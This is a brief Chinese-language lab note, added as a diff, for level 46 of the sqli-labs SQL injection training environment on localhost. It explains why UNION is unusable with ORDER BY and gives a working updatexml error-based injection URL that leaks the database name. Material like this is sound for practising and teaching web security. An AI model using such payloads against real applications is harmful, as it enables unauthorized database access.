@@ -1,0 +1,14 @@
+第46关
+
+这关通过数据sort，显示根据第sort列排序
+
+因为order by 不能和 union连用，所以这关不能用回显位
+
+这里可以用updatexml报错注入或者延时注入
+
+通过判断这关为数字型闭合
+http://127.0.0.1/sqli-labs/Less-46/?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
+
+
+
+闯关成功！！！
